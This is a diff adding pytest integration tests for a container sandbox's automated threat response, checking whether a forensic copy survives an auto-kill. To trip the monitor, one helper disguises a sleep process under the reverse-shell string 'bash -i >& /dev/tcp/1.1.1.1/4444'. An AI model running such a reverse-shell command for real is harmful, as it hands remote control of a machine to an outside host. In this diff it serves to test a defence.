@@ -837,6 +837,38 @@ class TestEnvironmentScanningPatterns:
         cleanup_container(container_name, coi_binary)
 
 
+@pytest.fixture
+def enable_monitoring_no_forensics():
+    """Monitoring with auto-kill but forensics_on_kill disabled — the kill
+    must NOT leave a forensic copy behind."""
+    config_path = Path.home() / ".coi" / "config.toml"
+    backup = config_path.read_text() if config_path.exists() else None
+
+    config_path.parent.mkdir(parents=True, exist_ok=True)
+    config_path.write_text(
+        """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+forensics_on_kill = false
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+"""
+    )
+
+    yield config_path
+
+    if backup:
+        config_path.write_text(backup)
+    elif config_path.exists():
+        config_path.unlink()
+
+
 class TestAutomatedResponse:
     """Test automated threat response system."""
 
@@ -904,6 +936,106 @@ class TestAutomatedResponse:
 
         proc.terminate()
         cleanup_container(container_name, coi_binary)
+
+    @staticmethod
+    def _forensic_copies(container_name):
+        """List <container>-forensics-* containers (name,status CSV rows)."""
+        result = subprocess.run(
+            ["incus", "list", "--format", "csv", "-c", "ns", f"{container_name}-forensics-"],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        return [row for row in result.stdout.strip().splitlines() if row]
+
+    @staticmethod
+    def _trigger_critical_and_wait_kill(coi_binary, test_workspace, slot):
+        """Start a shell, trigger a CRITICAL threat, wait for the auto-kill.
+        Returns (proc, container_name, killed)."""
+        proc = subprocess.Popen(
+            [coi_binary, "shell", "--workspace", test_workspace, "--slot", str(slot), "--debug"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        container_name = (
+            get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + f"-{slot}"
+        )
+        if not wait_for_container_running(container_name, timeout=30):
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found or not running")
+        time.sleep(10)  # let the monitoring baseline stabilize
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        time.sleep(5)
+        killed = False
+        for _ in range(25):
+            time.sleep(1)
+            if container_absent(container_name):
+                killed = True
+                break
+        return proc, container_name, killed
+
+    def test_kill_preserves_forensic_copy(self, test_workspace, enable_monitoring, coi_binary):
+        """An auto-kill fires exactly when the container state is most worth
+        investigating — the responder must preserve a stopped forensic copy
+        BEFORE the (ephemeral) container is stopped and deleted, so the
+        evidence survives the response ("snapshot state for investigation
+        before deactivating", Trail of Bits). Default-on behavior."""
+        proc, container_name, killed = self._trigger_critical_and_wait_kill(
+            coi_binary, test_workspace, slot=4
+        )
+        try:
+            assert killed, (
+                f"Container should be auto-killed, still {get_container_state(container_name)!r}"
+            )
+
+            # The copy is made before the kill completes, so it must already exist.
+            copies = self._forensic_copies(container_name)
+            assert copies, (
+                f"expected a {container_name}-forensics-* copy to survive the kill, "
+                "got none (forensics_on_kill defaults to true)"
+            )
+            # A copy of a running container lands STOPPED (disk snapshot, not live
+            # state) and non-ephemeral — i.e. it did NOT get auto-deleted on stop.
+            for row in copies:
+                assert "STOPPED" in row.upper(), f"forensic copy should be stopped: {row}"
+        finally:
+            proc.terminate()
+            for row in self._forensic_copies(container_name):
+                name = row.split(",")[0]
+                subprocess.run(
+                    ["incus", "delete", "--force", name], capture_output=True, timeout=60
+                )
+            cleanup_container(container_name, coi_binary)
+
+    def test_kill_without_forensics_when_disabled(
+        self, test_workspace, enable_monitoring_no_forensics, coi_binary
+    ):
+        """Opt-out: forensics_on_kill = false kills without leaving a copy."""
+        proc, container_name, killed = self._trigger_critical_and_wait_kill(
+            coi_binary, test_workspace, slot=5
+        )
+        try:
+            assert killed, (
+                f"Container should be auto-killed, still {get_container_state(container_name)!r}"
+            )
+            copies = self._forensic_copies(container_name)
+            assert not copies, f"no forensic copy expected when disabled, got {copies}"
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
 
 
 class TestPromptInjectionScenario:
